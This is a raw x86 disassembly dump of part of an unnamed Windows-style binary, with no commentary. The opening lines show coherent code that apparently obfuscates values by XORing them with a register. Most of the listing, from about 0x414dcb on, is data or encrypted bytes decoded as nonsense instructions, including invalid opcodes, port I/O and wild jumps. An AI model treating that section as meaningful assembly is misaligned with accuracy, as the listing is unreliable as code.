  414cde:	cmp    DWORD PTR ds:0x428e99,0x8
  414ce5:	jle    0x414d27
  414ceb:	jmp    0x414cf9
  414cf0:	push   DWORD PTR [ebp-0x20]
  414cf3:	call   DWORD PTR ds:0x42ca38
  414cf9:	cmp    DWORD PTR ds:0x428e99,0x9
  414d00:	jne    0x414d15
  414d06:	xor    ecx,ecx
  414d08:	add    ecx,DWORD PTR ds:0x428e99
  414d0e:	dec    ecx
  414d0f:	mov    DWORD PTR ds:0x428e99,ecx
  414d15:	mov    ecx,DWORD PTR ds:0x428e99
  414d1b:	dec    ecx
  414d1c:	mov    DWORD PTR ds:0x428e99,ecx
  414d22:	jmp    0x414cd1
  414d27:	mov    eax,DWORD PTR [ebp-0x4]
  414d2a:	mov    ecx,DWORD PTR [ebp-0x4]
  414d2d:	sub    eax,ecx
  414d2f:	mov    DWORD PTR [ebp-0x4],eax
  414d32:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  414d39:	mov    eax,DWORD PTR [ebp-0xc]
  414d3c:	xor    eax,esi
  414d3e:	add    eax,edi
  414d40:	push   eax
  414d41:	mov    eax,DWORD PTR [ebp-0x10]
  414d44:	xor    eax,esi
  414d46:	add    eax,edi
  414d48:	push   eax
  414d49:	mov    eax,DWORD PTR [ebp-0x4]
  414d4c:	xor    eax,esi
  414d4e:	add    eax,0x3272fc
  414d53:	push   eax
  414d54:	lea    eax,[ebp-0x78]
  414d57:	push   eax
  414d58:	push   DWORD PTR [ebp-0x2c]
  414d5b:	push   DWORD PTR [ebp-0x28]
  414d5e:	call   0x40f6a0
  414d63:	test   eax,eax
  414d65:	je     0x414d93
  414d6b:	lea    eax,[ebp-0x78]
  414d6e:	push   eax
  414d6f:	mov    eax,DWORD PTR [ebp-0x28]
  414d72:	xor    eax,esi
  414d74:	add    eax,edi
  414d76:	push   eax
  414d77:	mov    eax,DWORD PTR [ebp-0x24]
  414d7a:	add    eax,0xaa
  414d7f:	push   eax
  414d80:	mov    eax,DWORD PTR [ebp-0x24]
  414d83:	mov    eax,DWORD PTR [eax+0x198]
  414d89:	push   DWORD PTR [eax]
  414d8b:	call   0x40854d
  414d90:	mov    DWORD PTR [ebp-0x14],eax
  414d93:	mov    ecx,DWORD PTR ds:0x42845d
  414d99:	lea    eax,[ebp+0x4]
  414d9c:	mov    DWORD PTR [ecx*4+0x428455],eax
  414da3:	inc    DWORD PTR ds:0x42845d
  414da9:	mov    eax,DWORD PTR [ebp-0x14]
  414dac:	test   eax,eax
  414dae:	je     0x41717d
  414db4:	lea    eax,[ebp-0x8]
  414db7:	mov    DWORD PTR [ebp-0x34],eax
  414dba:	mov    eax,DWORD PTR [ebp-0x30]
  414dbd:	mov    DWORD PTR [ebp-0x8],eax
  414dc0:	mov    eax,DWORD PTR [ebp-0x8]
  414dc3:	mov    ecx,DWORD PTR [ebp-0x14]
  414dc6:	jmp    0x417123
  414dcb:	mov    cl,0x3d
  414dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dce:	aas    
  414dcf:	jns    0x414e38
  414dd1:	jns    0x414e40
  414dd3:	pop    edx
  414dd4:	popw   ds
  414dd6:	inc    ebp
  414dd7:	ss int3 
  414dd9:	loope  0x414d7d
  414ddb:	push   0xffffff95
  414ddd:	jl     0x414e5a
  414ddf:	mov    ebx,0x577b7b9e
  414de4:	test   DWORD PTR [edx+0x3862c032],ebp
  414dea:	adc    dl,BYTE PTR [esp+eax*2]
  414ded:	add    ebp,edi
  414def:	popf   
  414df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df1:	and    eax,0xac94082f
  414df6:	addr16 mov al,0xd4
  414df9:	inc    eax
  414dfa:	add    DWORD PTR [ecx-0x41],edx
  414dfd:	dec    edi
  414dfe:	dec    esi
  414dff:	not    BYTE PTR [esp+edx*4+0x1d]
  414e03:	mov    dh,0x22
  414e05:	inc    esi
  414e06:	pop    ebp
  414e07:	outs   dx,DWORD PTR ds:[esi]
  414e08:	adc    ebx,ebx
  414e0a:	pop    es
  414e0b:	pop    ecx
  414e0c:	sbb    ecx,ebx
  414e0e:	out    dx,al
  414e0f:	mov    ebp,DWORD PTR [ebx]
  414e11:	sti    
  414e12:	push   ecx
  414e13:	fild   QWORD PTR [ecx]
  414e15:	leave  
  414e16:	mov    esi,0xe138f0a9
  414e1b:	into   
  414e1c:	ds stos BYTE PTR es:[edi],al
  414e1e:	mov    edx,0xb3d6c424
  414e23:	pop    edx
  414e24:	imul   eax,esp,0x70
  414e27:	mov    esp,0xf1746da7
  414e2c:	xor    BYTE PTR [edx-0x68],ah
  414e2f:	lea    esp,[eax+0x7fc97648]
  414e35:	and    ah,BYTE PTR [eax-0x71]
  414e38:	cmc    
  414e39:	nop
  414e3a:	push   edx
  414e3b:	(bad)  
  414e3c:	enter  0xf064,0x84
  414e40:	xor    eax,DWORD PTR [edi-0x48faee78]
  414e46:	inc    edi
  414e47:	outs   dx,BYTE PTR ds:[esi]
  414e48:	ins    DWORD PTR es:[edi],dx
  414e49:	out    dx,eax
  414e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e4b:	out    dx,eax
  414e4c:	mov    bh,0x29
  414e4e:	mov    cl,0xff
  414e50:	repnz lahf 
  414e52:	cs push 0x20
  414e55:	out    dx,al
  414e56:	sbb    DWORD PTR [edx+ecx*8],0xd4c82521
  414e5d:	sar    DWORD PTR [edx-0x73],0xa2
  414e61:	pop    ebx
  414e62:	aam    0x70
  414e64:	rol    bl,cl
  414e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e67:	cmp    edx,DWORD PTR [edx]
  414e69:	cwde   
  414e6a:	fistp  QWORD PTR [ebx+0x64]
  414e6d:	int3   
  414e6e:	aad    0x34
  414e70:	ret    0x4f63
  414e73:	push   0x2725ae3b
  414e78:	cld    
  414e79:	xlat   BYTE PTR ds:[ebx]
  414e7a:	hlt    
  414e7b:	mov    eax,0xcb2cd7d8
  414e80:	jae    0x414e74
  414e82:	into   
  414e83:	sub    ebx,DWORD PTR fs:[ecx+0x1c]
  414e87:	in     al,0xef
  414e89:	mov    cl,0x5f
  414e8b:	and    BYTE PTR [edx],bh
  414e8d:	mov    dl,0xe6
  414e8f:	(bad)  
  414e90:	(bad)  
  414e91:	sbb    ebx,DWORD PTR [edx]
  414e93:	(bad)  
  414e94:	jo     0x414eec
  414e96:	inc    esi
  414e97:	or     BYTE PTR [esi+edi*4+0x3],al
  414e9b:	fisttp QWORD PTR [esi-0x28]
  414e9e:	mov    dl,0x60
  414ea0:	xor    sp,dx
  414ea3:	or     DWORD PTR [ebx+esi*4],0x8c1921e3
  414eaa:	std    
  414eab:	jb     0x414f21
  414ead:	stos   BYTE PTR es:[edi],al
  414eae:	test   BYTE PTR [ecx],0xc0
  414eb1:	mov    ecx,0xcbcefc90
  414eb6:	dec    eax
  414eb7:	and    al,0xb2
  414eb9:	or     al,0x1c
  414ebb:	pop    edx
  414ebc:	sub    eax,0x59abeed0
  414ec1:	xchg   edi,eax
  414ec2:	sbb    esp,eax
  414ec4:	xor    BYTE PTR [edi-0x2fa92fbb],0x53
  414ecb:	cdq    
  414ecc:	sbb    BYTE PTR [esi-0x48301365],0x72
  414ed3:	xor    DWORD PTR [esi*2+0x73f66066],ebx
  414eda:	dec    ebp
  414edb:	imul   ebx,DWORD PTR [ecx+0x172936a4],0xfffffff9
  414ee2:	add    ch,0xf2
  414ee5:	mov    eax,ds:0x11904f28
  414eea:	loop   0x414e7f
  414eec:	jmp    0x414ee5
  414eee:	rcr    DWORD PTR [edx],0x7a
  414ef1:	jmp    0x414f5c
  414ef3:	xlat   BYTE PTR ds:[ebx]
  414ef4:	xor    bh,BYTE PTR [ebp+0x72afd41e]
  414efa:	mov    esi,0x5a380451
  414eff:	inc    edx
  414f00:	fdiv   st(2),st
  414f02:	hlt    
  414f03:	add    dl,dl
  414f05:	lahf   
  414f06:	pop    esi
  414f07:	sub    al,0xd3
  414f09:	pushf  
  414f0a:	cmp    BYTE PTR [ecx+0x5f7a9c1a],cl
  414f10:	jle    0x414ec9
  414f12:	retf   0xce54
  414f15:	(bad)  
  414f16:	inc    esi
  414f17:	shr    DWORD PTR [esi+0x4a],0x8b
  414f1b:	pop    es
  414f1c:	test   eax,0x797722a0
  414f21:	mov    edx,0xfae9a0bd
  414f26:	mov    dh,0xc9
  414f28:	out    dx,al
  414f29:	jge    0x414f14
  414f2b:	cmp    eax,0x6396190d
  414f30:	push   eax
  414f31:	lock xchg edi,eax
  414f33:	mov    eax,0x2c269ab7
  414f38:	pop    es
  414f39:	or     ebx,ebx
  414f3b:	test   DWORD PTR fs:[edi+0x5dbf7ce2],0x66d601eb
  414f46:	dec    ebp
  414f47:	pushf  
  414f48:	jns    0x414f26
  414f4a:	mov    ebp,0x17ef872
  414f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f50:	push   esi
  414f51:	xchg   edi,eax
  414f52:	scas   al,BYTE PTR es:[edi]
  414f53:	iret   
  414f54:	mov    ebp,0x4835a593
  414f59:	outs   dx,DWORD PTR ds:[esi]
  414f5a:	xchg   ebp,eax
  414f5b:	dec    edx
  414f5c:	aaa    
  414f5d:	lods   al,BYTE PTR fs:[esi]
  414f5f:	(bad)  
  414f60:	(bad)  
  414f61:	sbb    eax,0x2a7fcfc2
  414f66:	adc    ecx,esi
  414f68:	dec    ebp
  414f69:	test   esp,edx
  414f6b:	and    ecx,esi
  414f6d:	mov    esp,0xc732bd47
  414f72:	(bad)  
  414f73:	or     DWORD PTR [ebx+esi*2-0x6ccb5c6],ecx
  414f7a:	lock imul esp,DWORD PTR [ebx-0x4d254f41],0x75043753
  414f85:	mov    BYTE PTR [eax-0x767e0dfe],dl
  414f8b:	mov    WORD PTR [ebp+esi*1+0x6b],gs
  414f8f:	sbb    DWORD PTR [ebp-0x4fb201ce],esi
  414f95:	adc    DWORD PTR [ecx+0x33313de6],ecx
  414f9b:	or     al,0x5b
  414f9d:	aad    0xb1
  414f9f:	popa   
  414fa0:	mov    cl,0xb1
  414fa2:	jae    0x414f28
  414fa4:	imul   eax,esp,0x21d0f393
  414faa:	mov    eax,0x10fe0632
  414faf:	add    ecx,DWORD PTR [ebx]
  414fb1:	ja     0x414f6c
  414fb3:	pop    esi
  414fb4:	add    eax,esp
  414fb6:	outs   dx,DWORD PTR ds:[esi]
  414fb7:	push   ds
  414fb8:	mov    cl,0x94
  414fba:	std    
  414fbb:	mov    eax,ds:0xf43dffbd
  414fc0:	sahf   
  414fc1:	mov    ebx,0x844e9271
  414fc6:	fst    QWORD PTR [esi-0x10d6228c]
  414fcc:	cmp    esp,esp
  414fce:	dec    ebp
  414fcf:	shl    ah,0x98
  414fd2:	sub    eax,0xbb03bb64
  414fd7:	sbb    DWORD PTR [ecx],ecx
  414fd9:	sub    DWORD PTR [edx*2+0x10e4111],ebp
  414fe0:	jmp    0xb7fa62f4
  414fe5:	sub    dh,ch
  414fe7:	lds    esp,FWORD PTR ds:[ecx-0x2]
  414feb:	(bad)  
  414fec:	(bad)  
  414fed:	jnp    0x414fff
  414fef:	frstor ds:0xb6db0703
  414ff5:	push   ds
  414ff6:	ja     0x414fec
  414ff8:	cmp    al,0x9
  414ffa:	pop    eax
  414ffb:	mov    eax,ds:0x5d94a6d3
  415000:	cmp    eax,DWORD PTR [ebx+0x6]
  415003:	pop    ds
  415004:	pop    eax
  415005:	inc    edi
  415006:	xor    eax,0x79c7e4a5
  41500b:	retf   0x441c
  41500e:	nop
  41500f:	sbb    DWORD PTR [eax+0x3f63554c],0x8bef9ced
  415019:	push   esp
  41501a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41501b:	pop    ss
  41501c:	push   ebx
  41501d:	jnp    0x415094
  41501f:	sbb    eax,ebx
  415021:	dec    edx
  415022:	jmp    0x3c95:0xa18a517f
  415029:	mov    bh,0x6d
  41502b:	mov    ecx,0x346bfeeb
  415030:	dec    edx
  415031:	xchg   BYTE PTR [edx-0x36],al
  415034:	jo     0x4150a5
  415036:	cli    
  415037:	pop    ebp
  415038:	fucom  st(6)
  41503a:	rcl    BYTE PTR [esi+ebp*2],cl
  41503d:	jnp    0x415009
  41503f:	shl    BYTE PTR [edi-0x5f],1
  415042:	ds out dx,eax
  415044:	shr    eax,0x11
  415047:	mov    bl,0x86
  415049:	je     0x415076
  41504b:	mov    dl,0xdc
  41504d:	iret   
  41504e:	push   esp
  41504f:	push   ebp
  415050:	pop    edx
  415051:	lahf   
  415052:	std    
  415053:	sub    esi,ecx
  415055:	inc    eax
  415056:	test   al,0xce
  415058:	stc    
  415059:	mov    fs,edx
  41505b:	popa   
  41505c:	jmp    0x41509d
  41505e:	repnz (bad) 
  415060:	sbb    al,0x0
  415062:	xchg   edx,eax
  415063:	clc    
  415064:	and    BYTE PTR [edx-0x55277b72],dl
  41506a:	aad    0x83
  41506c:	sar    BYTE PTR [eax+0x9],1
  41506f:	pop    ss
  415070:	adc    al,0xe7
  415072:	scas   al,BYTE PTR es:[edi]
  415073:	fwait
  415074:	xchg   ebp,eax
  415075:	and    dh,BYTE PTR [esi+edi*4+0x69]
  415079:	or     ebx,edx
  41507b:	or     DWORD PTR ds:0x16b07c0a,esp
  415081:	les    esp,FWORD PTR [esi]
  415083:	rep stos DWORD PTR es:[edi],eax
  415085:	dec    esi
  415086:	and    al,0xe0
  415088:	iret   
  415089:	xchg   esp,eax
  41508a:	xor    BYTE PTR [eax-0x2902a68e],0xcf
  415091:	jge    0x41504a
  415093:	mov    esi,0x44760ef9
  415098:	pop    ebx
  415099:	lods   al,BYTE PTR ds:[esi]
  41509a:	xchg   edx,eax
  41509b:	shrd   DWORD PTR [ebx],ebp,0xb3
  41509f:	jmp    0xc6eb:0xc26a5425
  4150a6:	xor    al,0x1e
  4150a8:	enter  0xffa6,0xc4
  4150ac:	fucomip st,st(3)
  4150ae:	(bad)  
  4150af:	pop    edi
  4150b0:	mov    esi,0x53369c4f
  4150b5:	ja     0x4150e7
  4150b7:	ret    
  4150b8:	cdq    
  4150b9:	add    DWORD PTR [eax+0x2b],ebx
  4150bc:	retf   0x93b3
  4150bf:	loop   0x415066
  4150c1:	sub    eax,0x2328c09e
  4150c6:	mov    al,ds:0xafaa0671
  4150cb:	push   edi
  4150cc:	push   ecx
  4150cd:	daa    
  4150ce:	pop    ebp
  4150cf:	adc    edx,eax
  4150d1:	enter  0x75e8,0x2a
  4150d5:	arpl   ax,dx
  4150d7:	call   0xafc0d6be
  4150dc:	ds popf 
  4150de:	mov    edx,DWORD PTR [ecx-0x1e]
  4150e1:	sbb    dl,BYTE PTR [edi-0x36ddb74f]
  4150e7:	adc    eax,0xfc0c5a8e
  4150ec:	test   DWORD PTR [ebx*1-0x5e938fa4],0xbcc77048
  4150f7:	xor    DWORD PTR ss:[esi-0x58],0x6
  4150fc:	mov    edi,0x4081c88b
  415101:	leave  
  415102:	adc    al,0x8d
  415104:	inc    esi
  415105:	retf   0x330c
  415108:	outs   dx,BYTE PTR ds:[esi]
  415109:	sbb    eax,0x42631941
  41510e:	test   DWORD PTR [eax+edx*4-0x119cc612],0x5441c1d5
  415119:	sub    BYTE PTR [ecx-0xf6246d],0xfb
  415120:	sbb    dh,BYTE PTR [edx+eiz*1+0xe]
  415124:	jno    0x415174
  415126:	cmp    eax,0x37ad2e1c
  41512b:	xchg   esi,eax
  41512c:	into   
  41512d:	push   esi
  41512e:	push   ds
  41512f:	cmp    DWORD PTR [ebp-0x36],ebx
  415132:	mov    dh,BYTE PTR [edi]
  415134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415135:	ret    0xbd9e
  415138:	xor    edi,ebx
  41513a:	std    
  41513b:	adc    al,0xda
  41513d:	mov    fs,WORD PTR [edi-0x57c52a17]
  415143:	shr    al,1
  415145:	aad    0x53
  415147:	adc    bh,BYTE PTR [ecx+0x509ec511]
  41514d:	das    
  41514e:	pop    ss
  41514f:	mov    al,0x35
  415151:	cmc    
  415152:	fmul   QWORD PTR [ebx+0x62]
  415155:	mov    al,ds:0xd0fdeced
  41515a:	shr    DWORD PTR [ebx+0x23],1
  41515d:	inc    esp
  41515e:	add    al,0x40
  415160:	ins    DWORD PTR es:[edi],dx
  415161:	icebp  
  415162:	lds    edi,FWORD PTR [ecx-0x7b4d41e9]
  415168:	xor    al,0xf7
  41516a:	inc    esp
  41516b:	bound  edx,QWORD PTR [ebx+eax*1-0xb3506f5]
  415172:	mov    dh,0x95
  415174:	jo     0x41512c
  415176:	sub    edi,esi
  415178:	fcmovbe st,st(1)
  41517a:	lds    esp,FWORD PTR [edi-0x1a10bf43]
  415180:	jge    0x4151bc
  415182:	das    
  415183:	into   
  415184:	push   edi
  415185:	in     al,0x49
  415187:	add    BYTE PTR [esi+ebp*1-0x6e],cl
  41518b:	fdivr  QWORD PTR [ebp-0x3a615ef9]
  415191:	sub    BYTE PTR [esi+0x75],dh
  415194:	inc    esp
  415195:	jmp    0x9d27:0x97b2f507
  41519c:	xbegin 0x3b063dfa
  4151a2:	inc    eax
  4151a3:	scas   eax,DWORD PTR es:[edi]
  4151a4:	pusha  
  4151a5:	loop   0x4151e4
  4151a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a8:	inc    eax
  4151a9:	or     al,0x3f
  4151ab:	xchg   ecx,eax
  4151ac:	sahf   
  4151ad:	sub    dl,BYTE PTR gs:[ecx]
  4151b0:	inc    edx
  4151b1:	push   ecx
  4151b2:	sbb    DWORD PTR [ebp-0x69cf57a4],edx
  4151b8:	into   
  4151b9:	sti    
  4151ba:	sbb    esi,ebx
  4151bc:	int3   
  4151bd:	repz stc 
  4151bf:	xor    DWORD PTR [esi-0x27],eax
  4151c2:	ds pop ecx
  4151c4:	push   eax
  4151c5:	mov    BYTE PTR [ebx-0x77a07f8e],al
  4151cb:	push   0x2325c0e9
  4151d0:	sbb    al,0xbe
  4151d2:	hlt    
  4151d3:	push   0x1280360e
  4151d8:	jae    0x415203
  4151da:	(bad)  
  4151dc:	jg     0x415160
  4151de:	push   edx
  4151df:	fdiv   QWORD PTR [edi]
  4151e1:	sub    al,BYTE PTR [ecx-0x33fd9efd]
  4151e7:	pop    ebp
  4151e8:	xlat   BYTE PTR ds:[ebx]
  4151e9:	fcmovnb st,st(6)
  4151eb:	sbb    ebp,esi
  4151ed:	add    eax,0xc1d39754
  4151f2:	jl     0x415263
  4151f4:	push   ecx
  4151f5:	xchg   DWORD PTR cs:[ecx+0x28],ebx
  4151f9:	mov    cl,0xe0
  4151fb:	push   eax
  4151fc:	std    
  4151fd:	cmp    eax,0xece10783
  415202:	popa   
  415203:	in     eax,dx
  415204:	mov    ah,0x59
  415206:	shr    DWORD PTR [edi+0x79d669cb],cl
  41520c:	js     0x415202
  41520e:	and    eax,0x4a9e9aee
  415213:	add    ah,BYTE PTR [edx-0x6638fec9]
  415219:	ja     0x4151c8
  41521b:	inc    esi
  41521c:	ficomp DWORD PTR [edi-0x887da8d]
  415222:	push   esp
  415223:	enter  0xc830,0x83
  415227:	loop   0x4151dd
  415229:	in     al,dx
  41522a:	cmp    DWORD PTR [esp+ebp*2-0x6ab0660e],ebp
  415231:	adc    edi,DWORD PTR [edx+ecx*2+0x77]
  415235:	sbb    eax,0x4e4be5ec
  41523a:	xor    dl,al
  41523c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41523d:	xchg   ecx,eax
  41523e:	enter  0x60a6,0xcb
  415242:	and    DWORD PTR [edx],ecx
  415244:	mov    dh,0x28
  415246:	cs or  eax,0xe19fabe0
  41524c:	add    DWORD PTR [ecx-0x2fc10340],0xffffffe5
  415253:	push   0xffffffd7
  415255:	sub    DWORD PTR [esi-0x382433d7],esp
  41525b:	xor    dh,BYTE PTR [ecx-0x1d]
  41525e:	add    DWORD PTR [eax],eax
  415260:	cs adc al,0x67
  415263:	pop    ecx
  415264:	jge    0x415257
  415266:	xchg   edi,eax
  415267:	mov    esi,0xcfd0f084
  41526c:	xor    ebx,DWORD PTR [edi]
  41526e:	call   0xd158:0x87a2fb8f
  415275:	ret    0x49c4
  415278:	idiv   edi
  41527a:	shl    DWORD PTR [esi+edx*1-0x49c5d44b],0xdb
  415282:	xchg   edx,eax
  415283:	aas    
  415284:	push   cs
  415285:	pop    esi
  415286:	scas   eax,DWORD PTR es:[edi]
  415287:	fcmovnu st,st(4)
  415289:	fisubr DWORD PTR [esi+0x5]
  41528c:	ins    BYTE PTR es:[edi],dx
  41528d:	mov    dh,0xb8
  41528f:	jge    0x415255
  415291:	lods   eax,DWORD PTR ds:[esi]
  415292:	xchg   edx,eax
  415293:	test   BYTE PTR [ebx-0xe],ch
  415296:	adc    edi,DWORD PTR [ecx]
  415298:	fstp   DWORD PTR [eax]
  41529a:	shl    edi,cl
  41529c:	fisttp QWORD PTR [esp+ebp*1-0x63]
  4152a0:	or     eax,0x5235d79c
  4152a5:	push   esp
  4152a6:	out    dx,al
  4152a7:	clc    
  4152a8:	jmp    0x3c67fd8d
  4152ad:	sbb    dh,BYTE PTR [ebp+0x3]
  4152b0:	mov    dh,0x93
  4152b2:	inc    edi
  4152b3:	mov    al,0xc0
  4152b5:	adc    al,0x56
  4152b7:	inc    esp
  4152b8:	sbb    DWORD PTR [edi-0x691a40b8],edx
  4152be:	xchg   ebx,eax
  4152bf:	adc    eax,0x5d20e060
  4152c4:	nop
  4152c5:	popa   
  4152c6:	retf   
  4152c7:	mov    bl,0x9f
  4152c9:	xor    BYTE PTR [esi+0x73],al
  4152cc:	or     ecx,DWORD PTR [edx+ebx*2-0x6d]
  4152d0:	add    DWORD PTR [edx-0x11],0xc9e5c942
  4152d7:	sub    DWORD PTR [edx],ebx
  4152d9:	jmp    0x16c28feb
  4152de:	pop    edi
  4152df:	add    al,dh
  4152e1:	shl    DWORD PTR [eax+0x2e],0x0
  4152e5:	or     al,0x91
  4152e7:	and    al,0xf1
  4152e9:	push   0xffffffb6
  4152eb:	or     eax,0xdb46b4fd
  4152f0:	pop    ebp
  4152f1:	mov    eax,ebp
  4152f3:	or     esi,eax
  4152f5:	icebp  
  4152f6:	in     al,0x21
  4152f8:	or     dh,BYTE PTR [esi-0x78]
  4152fb:	pop    es
  4152fc:	inc    DWORD PTR [esi]
  4152fe:	jae    0x4152d1
  415300:	nop
  415301:	and    ecx,DWORD PTR fs:[edi]
  415304:	repz in eax,dx
  415306:	test   BYTE PTR [edi+0x16bd6255],bh
  41530c:	aad    0xdd
  41530e:	jns    0x415343
  415310:	out    dx,eax
  415311:	hlt    
  415312:	fbstp  TBYTE PTR [ebx+0x36]
  415315:	jl     0x41530b
  415317:	lds    eax,FWORD PTR [edi]
  415319:	mov    bl,BYTE PTR [esi+ebp*4]
  41531c:	inc    ecx
  41531d:	les    edi,FWORD PTR [ecx+0xbdd9b7f]
  415323:	popa   
  415324:	jle    0x41531b
  415326:	ins    BYTE PTR es:[edi],dx
  415327:	sbb    dh,BYTE PTR [edi]
  415329:	outs   dx,BYTE PTR ds:[esi]
  41532a:	and    BYTE PTR [edx],ah
  41532c:	in     al,0x96
  41532e:	sub    al,0x2f
  415330:	cmp    al,0xf5
  415332:	mov    esp,DWORD PTR [ebp+0x3c3655b6]
  415338:	ret    
  415339:	dec    edi
  41533a:	pop    ecx
  41533b:	bound  eax,QWORD PTR [ebp-0x3e]
  41533e:	and    eax,DWORD PTR [ebx-0x44]
  415341:	scas   eax,DWORD PTR es:[edi]
  415342:	repnz mov esp,DWORD PTR [ebp+0x55]
  415346:	imul   esp,DWORD PTR [ebp-0x401bc323],0x80843007
  415350:	in     al,dx
  415351:	inc    ecx
  415352:	push   ecx
  415353:	test   eax,0x4cf7dd87
  415358:	dec    ebp
  415359:	adc    eax,0xa9e8d168
  41535e:	cwde   
  41535f:	push   ebx
  415360:	adc    eax,0x21c99c78
  415365:	retf   0x34ac
  415368:	ins    BYTE PTR es:[edi],dx
  415369:	retf   0x9440
  41536c:	sbb    bh,al
  41536e:	ins    DWORD PTR es:[edi],dx
  41536f:	cmp    al,0x65
  415371:	cmp    DWORD PTR [ebp-0x5bc670e0],edi
  415377:	push   ss
  415378:	inc    esi
  415379:	add    eax,0x4aad0bb1
  41537e:	pop    eax
  41537f:	out    0x50,eax
  415381:	(bad)  
  415382:	imul   esp,edi,0x1f
  415385:	mov    ebx,0x3f5610ce
  41538a:	montmul (bad)
  41538b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41538c:	add    BYTE PTR [ebp+0x46],0x15
  415390:	retf   
  415391:	jmp    0xd0c6:0x66bc61d2
  415398:	loopne 0x4153cb
  41539a:	shl    ecx,cl
  41539c:	sbb    eax,0x84fe29a6
  4153a1:	ss scas al,BYTE PTR es:[edi]
  4153a3:	mov    eax,0xaf4a5644
  4153a8:	scas   eax,DWORD PTR es:[edi]
  4153a9:	xchg   edx,eax
  4153aa:	inc    eax
  4153ab:	cmp    bh,BYTE PTR [esi-0x16]
  4153ae:	pop    ss
  4153af:	bsf    edx,DWORD PTR [edi-0x49ca281]
  4153b6:	push   ecx
  4153b7:	sub    al,0x90
  4153b9:	je     0x415379
  4153bb:	ds or  al,0x7c
  4153be:	push   es
  4153bf:	inc    ebp
  4153c0:	(bad)
  4153c4:	mov    ?,ebp
  4153c6:	cmp    eax,0xf0b711a7
  4153cb:	mov    al,0xf1
  4153cd:	and    eax,DWORD PTR [ebp-0xdb77326]
  4153d3:	into   
  4153d4:	pop    es
  4153d5:	mov    eax,ds:0x8d31cf9c
  4153da:	es push edi
  4153dc:	xor    ebx,DWORD PTR [ecx]
  4153de:	daa    
  4153df:	js     0x415406
  4153e1:	mov    ecx,0x7ec922b9
  4153e6:	fist   DWORD PTR [edi+eiz*2+0x7c478717]
  4153ed:	lds    ebp,FWORD PTR [eax+0x46f3800]
  4153f3:	cmp    eax,0xcd12852f
  4153f8:	psllq  mm0,QWORD PTR ds:0x4c1a44ac
  4153ff:	add    BYTE PTR [edi],0x1f
  415402:	loope  0x4153c4
  415404:	and    bh,al
  415406:	fwait
  415407:	jmp    FWORD PTR [eax-0x41ec4454]
  41540d:	sub    eax,0xe3c562d3
  415412:	scas   al,BYTE PTR es:[edi]
  415413:	nop
  415414:	sub    DWORD PTR ds:0x6361b2d9,ebp
  41541a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541b:	sub    ebp,ebp
  41541d:	pushf  
  41541e:	add    eax,DWORD PTR [edi-0x586e14de]
  415424:	call   0xeb877e0
  415429:	jo     0x41541f
  41542b:	inc    ecx
  41542c:	scas   al,BYTE PTR es:[edi]
  41542d:	add    BYTE PTR [ebp-0x43c81bca],dl
  415433:	jmp    0x99318b4d
  415438:	test   edx,esi
  41543a:	out    dx,eax
  41543b:	push   ss
  41543c:	push   ss
  41543d:	jmp    0x6b00e0d6
  415442:	ret    0x4271
  415445:	mov    ah,0xc1
  415447:	push   edx
  415448:	icebp  
  415449:	sahf   
  41544a:	jge    0x4154b0
  41544c:	jmp    0x415427
  41544e:	scas   al,BYTE PTR es:[edi]
  41544f:	adc    DWORD PTR [ebp-0xa4b08e9],esi
  415455:	xor    al,0xfa
  415457:	mov    ah,0x59
  415459:	js     0x4154cd
  41545b:	inc    esi
  41545c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545d:	shr    BYTE PTR [eax+0x2c],cl
  415460:	call   0xd86bc95d
  415465:	push   eax
  415466:	xor    eax,DWORD PTR [eax+0x41f36bfe]
  41546c:	xor    al,0x4e
  41546e:	ja     0x41542f
  415470:	cmp    DWORD PTR [ebp+esi*8-0x3df75ebe],0x22
  415478:	jo     0x4154d2
  41547a:	lea    ebp,[edx-0x1d]
  41547d:	aam    0x97
  41547f:	ins    BYTE PTR es:[edi],dx
  415480:	cmp    DWORD PTR [ecx-0x4],0x6dd28720
  415487:	sar    BYTE PTR [edx-0x27],1
  41548a:	bound  ebx,QWORD PTR [edx+0x5e]
  41548d:	or     eax,0x42c7343b
  415492:	rol    DWORD PTR [edi+0x77],0x92
  415496:	hlt    
  415497:	pop    esp
  415498:	test   eax,0xede466d2
  41549d:	mov    bl,0x59
  41549f:	shl    DWORD PTR [edx+edi*4],1
  4154a2:	inc    edi
  4154a3:	stos   DWORD PTR es:[edi],eax
  4154a4:	lods   eax,DWORD PTR ds:[esi]
  4154a5:	ror    edi,cl
  4154a7:	adc    BYTE PTR [ebp+0x2e2e139c],0x1e
  4154ae:	jae    0x41548b
  4154b0:	test   BYTE PTR [esi],0xe4
  4154b3:	jg     0x415506
  4154b5:	mov    esp,0x82730b1b
  4154ba:	(bad)  
  4154bb:	xor    eax,ecx
  4154bd:	ins    DWORD PTR es:[edi],dx
  4154be:	push   esi
  4154bf:	mov    ecx,0xd3c2ba7b
  4154c4:	lods   al,BYTE PTR ds:[esi]
  4154c5:	aam    0x4f
  4154c7:	fcomp  DWORD PTR [esi-0x44a4797b]
  4154cd:	(bad)  
  4154ce:	mov    ds:0xa14a7aa9,eax
  4154d3:	ins    DWORD PTR es:[edi],dx
  4154d4:	push   edx
  4154d5:	add    BYTE PTR [esi-0x4f0a9e67],al
  4154db:	in     al,0xc1
  4154dd:	(bad)  
  4154de:	push   esi
  4154df:	outs   dx,BYTE PTR ds:[esi]
  4154e0:	mov    al,ds:0xe097cbd5
  4154e5:	lods   eax,DWORD PTR ds:[esi]
  4154e6:	xchg   ebp,eax
  4154e7:	loope  0x415503
  4154e9:	jbe    0x415523
  4154eb:	push   esp
  4154ec:	rol    BYTE PTR [eax],0x70
  4154ef:	pop    ds
  4154f0:	cmp    eax,0x3e4bd91e
  4154f5:	gs cmc 
  4154f7:	cmp    DWORD PTR [ebx-0x6c],0xffffffb6
